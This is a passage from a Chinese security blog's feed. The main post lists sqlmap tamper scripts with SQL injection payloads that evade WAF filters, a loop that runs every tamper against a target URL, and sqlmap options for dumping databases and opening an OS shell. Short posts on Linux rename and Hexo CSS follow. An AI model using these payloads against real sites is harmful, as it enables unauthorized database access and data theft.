，只编码非编码字符</p><pre><code>select * from usersto\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</code></pre><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><p>commalesslimit.py： </p><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><pre><code>limit 2,1tolimit 1 offset 2</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commalessmid.py： </p><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><pre><code>mid(version(), 1, 1)tomid(version() from 1 for 1)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commentbeforeparentheses.py： </p><pre><code>retVal = re.sub(r&quot;\b(\w+)(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)</code></pre><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><pre><code>union select group_concat(table_name)tounion select group_concat/**/(table_name)</code></pre><p><strong>适用数据库：</strong>ALL</p><p>concat2concatws.py： </p><pre><code>payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</code></pre><p>用于过滤了 concat 函数的情况</p><pre><code>concat(1,2)toconcat_ws(mid(char(0), 0, 0), 1, 2)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>equaltolike.py： </p><pre><code>retVal = re.sub(r&quot;\s=\s&quot;, &quot; LIKE &quot;, retVal)</code></pre><p>将等号用 like 代替，用于过滤了等号的情况</p><pre><code>select * from users where id=1toselect * from users where id like 1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>escapequotes.py： </p><pre><code>return payload.replace(&quot;&apos;&quot;, &quot;\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\&quot;&apos;)</code></pre><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><pre><code>1&apos; and 1=1--+to1\\&apos; and 1=1--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>greatest.py： </p><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><pre><code>1 and a&gt;bto1 and greatest(a,b+1)=a</code></pre><p>ALL</p><p>halfversionedmorekeywords.py： </p><p>在关键字前添加注释，用于过滤了关键字的情况</p><pre><code>union select 1,2to/*!0union/*!0select 1,2</code></pre><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><p>htmlencode.py： </p><pre><code>return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload</code></pre><p>从名字就知道是将 payload 进行 html 编码</p><pre><code>1&apos; and 1=1--+to&amp;#49;&amp;#39;&amp;#32;&amp;#97;&amp;#110;&amp;#100;&amp;#32;&amp;#49;&amp;#61;&amp;#49;&amp;#45;&amp;#45;&amp;#43;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>ifnull2ifisnull.py： </p><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><pre><code>ifnull(1, 2)toif(isnull(1), 2, 1)</code></pre><p><strong>适用数据库：</strong>MySql</p><p>informationschemacomment.py： </p><pre><code>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)</code></pre><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><pre><code>select table_name from information_schema.tablestoselect table_name from information_schema/**/.tables</code></pre><p><strong>适用数据库：</strong>ALL</p><p>lowercase.py： </p><p>将 payload 里的大写转为小写</p><pre><code>UNION SELECTtounion select</code></pre><p><strong>适用数据库：</strong>ALL</p><p>modsecurityversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><pre><code>1 and 2&gt;1--+to1 /*!30874and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>modsecurityzeroversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><pre><code>1 and 2&gt;1--+to1 /*!00000and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>multiplespaces.py： </p><p>在关键字周围添加多个空格</p><pre><code>union select 1,2--+tounion         select       1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>nonrecursivereplacement.py： </p><p>关键字双写，可用于关键字过滤</p><pre><code>union select 1,2--+touniounionn selecselectt 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>overlongutf8.py： </p><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><pre><code>select field from table where 2&gt;1toselect%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>percentage.py： </p><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><pre><code>select * from usersto%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s</code></pre><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><p>plus2concat.py： </p><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><pre><code>select char(13)+char(114)+char(115) from usertoselect concat(char(113),char(114),char(115)) from user</code></pre><p><strong>适用数据库：</strong>SQL Server 2012+</p><p>plus2fnconcat.py： </p><p>用 fn concat 来替代加号，和上面类似</p><pre><code>select char(13)+char(114)+char(115) from usertoselect {fn concat({ fn concat(char(113),char(114))},char(115))} from user</code></pre><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><p>randomcase.py： </p><p>将 payload 随机大小写，可用于大小写绕过的情况</p><pre><code>union select 1,2--+toUniOn SElect 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>randomcomments.py： </p><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><pre><code>union select 1,2--+toun/**/ion sele/**/ct 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>securesphere.py： </p><pre><code>return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload</code></pre><p>在 payload 后面加入字符串，可以自定义</p><pre><code>1&apos; and 1=1to1&apos; and 1=1 &apos;0having&apos;=&apos;0having&apos;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>sp_password.py： </p><pre><code>retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)</code></pre><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><pre><code>1’  and 1=1--+to1 and 1=1-- sp_password</code></pre><p><strong>适用数据库：</strong>MSSQL</p><p>space2comment.py： </p><p>用 /**/ 替代空格，用于空格的绕过</p><pre><code>union select 1,2--+tounion/**/select/**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2dash.py： </p><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+tounion–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><p>space2hash.py： </p><p>和上面类似，不过这儿是用#注释符</p><pre><code>union select 1,2--+tounion%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2morecomment.py： </p><p>将空格用 /<strong>_</strong>/ 替代</p><pre><code>union select 1,2--+tounion/**_**/select/**_**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2morehash.py： </p><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><pre><code>space2hash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2--+space2morehash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>space2mssqlblank.py： </p><pre><code>blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%01select%021,2--+</code></pre><p><strong>适用数据库：</strong>SQL Server</p><p>space2mssqlhash.py： </p><p>用 # 加一个换行符替换 payload 中的空格</p><pre><code>union select 1,2--+ tounion%23%0Aselect%23%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MSSQL、MySQL</p><p>space2mysqlblank.py： </p><pre><code>blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)</code></pre><p>用这些随机空白符替换payload中的空格</p><pre><code>union select 1,2--+tounion%09select%0D1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2mysqldash.py： </p><p>用 – 加一个换行符替换空格</p><pre><code>union select 1,2--+tounion--%0Aselect--%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL、MSSQL</p><p>space2plus.py： </p><p>用 + 替换空格</p><pre><code>union select 1,2--+tounion+select+1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2randomblank.py： </p><pre><code>blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%09select%0C1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>symboliclogical.py： </p><pre><code>retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</code></pre><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><pre><code>1 and 1=1to1 %26%26 1=11 or 1=1to1 %7c%7c 1=1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unionalltounion.py： </p><pre><code>return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</code></pre><p>用 union select 替换union all select</p><pre><code>union all select 1,2--+tounion select 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unmagicquotes.py： </p><p>用宽字符绕过 GPC addslashes</p><pre><code>1‘ and 1=1to1%df%27 and 1=1--</code></pre><p><strong>适用数据库：</strong>ALL</p><p>uppercase.py： </p><p>将 payload 大写</p><pre><code>union selecttoUNION SELECT</code></pre><p><strong>适用数据库：</strong>ALL</p><p>varnish.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload</code></pre><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><pre><code>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</code></pre><p><strong>适用数据库：</strong>ALL</p><p>versionedkeywords.py </p><p>对不是函数的关键字进行注释</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p>to</p><pre><code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>versionedmorekeywords.py： </p><p>注释每个关键字</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</code></pre><p>to</p><pre><code>1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))#</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>xforwardedfor.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload</code></pre><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p><p><strong>说明下 :</strong></p><p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.sina.com.cn/s/blog_6b347b2a0101379o.html" target="_blank" rel="noopener">Cookie SQL注入</a><br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmapproject/sqlmap</a><br><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection knowledge base</a><br><a href="http://sqlwiki.radare.cn/#/" target="_blank" rel="noopener">sql注入wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-安装&quot;&gt;&lt;a href=&quot;#0x00-安装&quot; class=&quot;headerlink&quot; title=&quot;0x00 安装&quot;&gt;&lt;/a&gt;0x00 安装&lt;/h2&gt;&lt;p&gt;git clone &lt;a href=&quot;https://github.com/sqlmapproject/sqlmap.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/sqlmapproject/sqlmap.git&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-基本用法&quot;&gt;&lt;a href=&quot;#0x01-基本用法&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本用法&quot;&gt;&lt;/a&gt;0x01 基本用法&lt;/h2&gt;&lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h3&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-dbs       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--count&lt;/span&gt; -D “数据库”   &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;获取表中数据个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-db&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--passwords&lt;/span&gt;              &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-user&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--privileges&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;查看权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--os-shell&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;写web shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--is-dba&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;判断当前用户是不是dba&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--tables&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;          &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库的表名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--columns&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt; 列举列名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--dump&lt;/span&gt; -C &lt;span class=&quot;string&quot;&gt;&quot;列名&quot;&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--start=&lt;/span&gt;：指定开始的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--stop=&lt;/span&gt;：指定结束的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--threads=&lt;/span&gt;:线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;存储数据在 &lt;span class=&quot;string&quot;&gt;./sqlmap/output/.......&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-f &lt;span class=&quot;params&quot;&gt;--banner&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--crawl=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为2以上，会尝试注入cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为3以上，会尝试注入user-agent、referer&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux下批量重命名rename</title>
    <link href="http://www.pa55w0rd.club/rename-linux/"/>
    <id>http://www.pa55w0rd.club/rename-linux/</id>
    <published>2018-11-22T07:53:44.000Z</published>
    <updated>2018-11-22T08:08:30.961Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统：Ubuntu</p><h2 id="安装rename"><a href="#安装rename" class="headerlink" title="安装rename"></a>安装rename</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install rename -y</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>-n：打印效果但不执行</p></li><li><p>-v：执行修改并打印结果</p></li><li><p>s：替换，支持正则表达式</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>替换文件名中的字符串，将test1替换为test2</p><p> renema -v ‘s/test1/test2’ *.md</p></li><li><p>去掉文件名中的日期，格式2018-10-10</p><p> rename -v ‘s/\d{4}-\d{2}-\d{2}//‘ *.md  </p></li><li><p>去掉文件后缀名.bak</p><p> rename ‘s/.bak$//‘ *.bak</p></li><li><p>去掉文件名中的空格</p><p> rename ‘s/[ ]+//g’ *</p></li><li><p>在文件开头加入字符串test1</p><p> rename ‘s/^/test1/‘ *</p></li><li><p>在文件结尾加入字符串</p><p> rename ‘s/$/test1/‘ *</p></li><li><p>替换文件名中的大小写</p><p> rename -v ‘y/A-Z/a-z/‘ *</p></li></ol><p><strong><a href="http://tool.oschina.net/regex/#" target="_blank" rel="noopener">在线正则表达式测试</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统：Ubuntu&lt;/p&gt;
&lt;h2 id=&quot;安装rename&quot;&gt;&lt;a href=&quot;#安装rename&quot; class=&quot;headerlink&quot; title=&quot;安装rename&quot;&gt;&lt;/a&gt;安装rename&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# apt-get install rename -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>hexo添加文章目录</title>
    <link href="http://www.pa55w0rd.club/add_toc/"/>
    <id>http://www.pa55w0rd.club/add_toc/</id>
    <published>2018-11-21T08:15:18.000Z</published>
    <updated>2018-12-04T09:11:19.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有的文章比较长，翻页查阅比较麻烦，添加文章目录功能</p><h2 id="0x01-添加文章目录"><a href="#0x01-添加文章目录" class="headerlink" title="0x01 添加文章目录"></a>0x01 添加文章目录</h2><a id="more"></a><h3 id="添加css样式"><a href="#添加css样式" class="headerlink" title="添加css样式"></a>添加css样式</h3><p>打开<code>themes\Landscape-x\source\css\_partial\article.styl</code>，添加下面代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 新添加的 */</span></span><br><span class="line"><span class="selector-id">#container</span> <span class="selector-class">.show-toc-btn</span>,<span class="selector-id">#container</span> <span class="selector-class">.toc-article</span>&#123;<span class="attribute">display</span>:block&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span>&#123;<span class="attribute">z-index</span>:<span class="number">100</span>;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;<span class="attribute">max-width</span>:<span class="number">250px</span>;<span class="attribute">min-width</span>:<span class="number">150px</span>;<span class="attribute">max-height</span>:<span class="number">500px</span>;<span class="attribute">overflow-y</span>:auto;<span class="attribute">-webkit-box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">35px</span>;<span class="attribute">top</span>:<span class="number">129px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span>&#123;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">font-size</span>:<span class="number">20px</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">float</span>:right;<span class="attribute">color</span>:<span class="number">#ccc</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">0</span>;<span class="attribute">line-height</span>:<span class="number">20px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-number</span>&#123;<span class="attribute">color</span>:<span class="number">#333</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-text</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:underline;<span class="attribute">color</span>:<span class="number">#2a6496</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-tag">li</span>&#123;<span class="attribute">list-style-type</span>:none&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-level-1</span>&#123;<span class="attribute">margin</span>:<span class="number">4px</span> <span class="number">0</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-child</span>&#123;&#125;@-<span class="keyword">moz</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span 